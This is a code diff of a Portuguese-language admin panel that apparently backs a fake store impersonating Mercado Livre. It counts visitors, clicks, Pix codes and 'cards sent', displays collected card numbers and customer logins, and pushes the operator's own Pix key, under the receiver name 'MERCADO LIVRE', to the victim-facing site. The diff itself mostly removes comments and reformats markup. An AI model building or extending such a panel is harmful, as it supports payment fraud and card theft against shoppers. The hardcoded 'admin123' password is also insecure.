@@ -9,7 +9,6 @@
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; background: #0a0e14; color: #e0e0e0; font-size: 14px; min-height: 100vh; }
 
-    /* LOGIN */
     #loginBox { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #0a0e14; }
     .login-card { background: #131a24; border: 1px solid #2a3544; border-radius: 12px; padding: 40px; width: 360px; text-align: center; }
     .login-card h1 { font-size: 22px; margin-bottom: 8px; color: #00ff88; }
@@ -21,7 +20,6 @@
       border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; }
     .login-card .erro { color: #ff3b30; font-size: 13px; margin-top: 12px; display: none; }
 
-    /* PAINEL */
     #painel { display: none; }
     .header { background: #131a24; border-bottom: 1px solid #2a3544; padding: 16px 24px;
       display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
@@ -86,7 +84,6 @@
     .cartao-dados .label { color: #6a7a8c; font-size: 11px; }
     .cartao-dados .val { color: #e0e0e0; font-weight: 600; }
 
-    /* PIX CONFIG */
     .pix-config { background: #131a24; border: 1px solid #2a3544; border-radius: 12px; padding: 20px; margin-bottom: 24px; }
     .pix-config h3 { font-size: 14px; color: #00ff88; margin-bottom: 16px; }
     .pix-config label { display: block; font-size: 12px; color: #6a7a8c; margin-bottom: 6px; }
@@ -105,7 +102,6 @@
 </head>
 <body>
 
-  <!-- LOGIN -->
   <div id="loginBox">
     <div class="login-card">
       <h1>🔐 Painel Admin</h1>
@@ -116,7 +112,6 @@
     </div>
   </div>
 
-  <!-- PAINEL -->
   <div id="painel">
     <div class="header">
       <h1>⚡ Painel Admin</h1>
@@ -127,39 +122,16 @@
       </div>
     </div>
 
-    <!-- CARDS -->
     <div class="cards">
-      <div class="card online">
-        <div class="label">🟢 Online agora</div>
-        <div class="valor" id="cardOnline">0</div>
-      </div>
-      <div class="card visitas">
-        <div class="label">👁️ Total de visitas</div>
-        <div class="valor" id="cardVisitas">0</div>
-      </div>
-      <div class="card cliques">
-        <div class="label">🛒 Cliques em comprar</div>
-        <div class="valor" id="cardCliques">0</div>
-      </div>
-      <div class="card pix">
-        <div class="label">💠 Pix gerados</div>
-        <div class="valor" id="cardPix">0</div>
-      </div>
-      <div class="card copiados">
-        <div class="label">📋 Pix copiados</div>
-        <div class="valor" id="cardCopiados">0</div>
-      </div>
-      <div class="card cartoes">
-        <div class="label">💳 Cartões enviados</div>
-        <div class="valor" id="cardCartoes">0</div>
-      </div>
-      <div class="card">
-        <div class="label">💰 Valor total pedidos</div>
-        <div class="valor" id="cardValor" style="color:#00ff88">R$ 0,00</div>
-      </div>
+      <div class="card online"><div class="label">🟢 Online agora</div><div class="valor" id="cardOnline">0</div></div>
+      <div class="card visitas"><div class="label">👁️ Total de visitas</div><div class="valor" id="cardVisitas">0</div></div>
+      <div class="card cliques"><div class="label">🛒 Cliques em comprar</div><div class="valor" id="cardCliques">0</div></div>
+      <div class="card pix"><div class="label">💠 Pix gerados</div><div class="valor" id="cardPix">0</div></div>
+      <div class="card copiados"><div class="label">📋 Pix copiados</div><div class="valor" id="cardCopiados">0</div></div>
+      <div class="card cartoes"><div class="label">💳 Cartões enviados</div><div class="valor" id="cardCartoes">0</div></div>
+      <div class="card"><div class="label">💰 Valor total pedidos</div><div class="valor" id="cardValor" style="color:#00ff88">R$ 0,00</div></div>
     </div>
 
-    <!-- CONFIG PIX -->
     <div class="secao">
       <h2>💠 Configurar Pix</h2>
       <div class="pix-config">
@@ -178,10 +150,9 @@
       </div>
     </div>
 
-    <!-- PEDIDOS -->
     <div class="secao">
       <h2>📦 Pedidos <span class="count" id="countPedidos">0</span></h2>
-      <table class="tabela" id="tabelaPedidos">
+      <table class="tabela">
         <thead>
           <tr>
             <th>Cliente / Login</th>
@@ -199,21 +170,15 @@
       </table>
     </div>
 
-    <!-- ALERTAS -->
     <div class="secao">
       <h2>🔔 Alertas recentes</h2>
       <table class="tabela">
-        <thead>
-          <tr><th>Tipo</th><th>Cliente</th><th>Quando</th></tr>
-        </thead>
-        <tbody id="corpoAlertas">
-          <tr><td colspan="3" class="vazio">Nenhum alerta...</td></tr>
-        </tbody>
+        <thead><tr><th>Tipo</th><th>Cliente</th><th>Quando</th></tr></thead>
+        <tbody id="corpoAlertas"><tr><td colspan="3" class="vazio">Nenhum alerta...</td></tr></tbody>
       </table>
     </div>
   </div>
 
-  <!-- FIREBASE -->
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
@@ -228,7 +193,6 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     const SENHA_ADMIN = 'admin123';
 
     function entrar() {
@@ -241,7 +205,6 @@
         document.getElementById('erroLogin').style.display = 'block';
       }
     }
-
     function sair() { location.reload(); }
 
     function tocarAlerta() {
@@ -277,7 +240,6 @@
       document.getElementById('cardValor').textContent = 'R$ ' + stats.valor.toFixed(2).replace('.', ',');
     }
 
-    /* FORMATA NÚMERO DO CARTÃO */
     function formatNumCartao(num) {
       if (!num) return '-';
       const limpo = num.replace(/\s/g, '');
@@ -288,7 +250,6 @@
       const tbody = document.getElementById('corpoPedidos');
       const ids = Object.keys(pedidos);
       document.getElementById('countPedidos').textContent = ids.length;
-
       if (ids.length === 0) {
         tbody.innerHTML = '<tr><td colspan="7" class="vazio">Nenhum pedido ainda...</td></tr>';
         return;
@@ -313,7 +274,6 @@
         else if (p.pix) { statusTxt = '💠 Gerou Pix'; statusClass = 'pendente'; }
         else if (p.clicouComprar) { statusTxt = '🛒 Clicou comprar'; statusClass = 'pendente'; }
 
-        /* DADOS DO CARTÃO */
         let cartaoHtml = '-';
         if (p.cartao) {
           const c = p.cartao;
@@ -358,7 +318,6 @@
     function confirmar(id) {
       db.ref('pedidos/' + id).update({ status: 'pago', confirmadoEm: Date.now() });
     }
-
     function deletar(id) {
       if (!confirm('Deletar pedido ' + id + '?')) return;
       db.ref('pedidos/' + id).remove();
@@ -371,10 +330,7 @@
       const c2 = confirm('⚠️ ÚLTIMA CONFIRMAÇÃO\n\nTodos os dados serão perdidos PERMANENTEMENTE.\n\nConfirmar limpeza total?');
       if (!c2) return;
       const senha = prompt('Digite a senha de admin para confirmar:');
-      if (senha !== SENHA_ADMIN) {
-        alert('❌ Senha incorreta. Limpeza cancelada.');
-        return;
-      }
+      if (senha !== SENHA_ADMIN) { alert('❌ Senha incorreta. Limpeza cancelada.'); return; }
       Promise.all([
         db.ref('visitas').remove(),
         db.ref('pedidos').remove(),
@@ -399,26 +355,18 @@
       `).join('');
     }
 
-    /* GERAR PIX COM pix-br-code */
     async function gerarPixConfig() {
       const chave = document.getElementById('chavePixInput').value.trim();
       const nome = document.getElementById('nomeRecebedor').value.trim() || 'MERCADO LIVRE';
       const cidade = document.getElementById('cidadeRecebedor').value.trim() || 'SAO PAULO';
-
       if (!chave) { alert('Digite a chave Pix'); return; }
-
-      /* Valor padrão do pedido */
       const valor = 159.44;
-
       try {
         const copiaECola = await Pix(chave, nome, cidade, valor.toFixed(2), 'PEDIDO' + Date.now());
         const qrCode = await Pix(chave, nome, cidade, valor.toFixed(2), 'PEDIDO' + Date.now(), true);
-
         document.getElementById('pixQrPreview').src = qrCode;
         document.getElementById('pixCopiaColaPreview').value = copiaECola;
         document.getElementById('pixPreview').style.display = 'block';
-
-        /* Salva no Firebase para o site do cliente escutar */
         await db.ref('pixConfig').update({
           chave: copiaECola,
           qrCode: qrCode,
@@ -427,7 +375,6 @@
           cidade: cidade,
           atualizadoEm: Date.now()
         });
-
         alert('✅ Pix gerado e enviado para o site do cliente!');
       } catch(e) {
         alert('❌ Erro ao gerar Pix: ' + e.message);
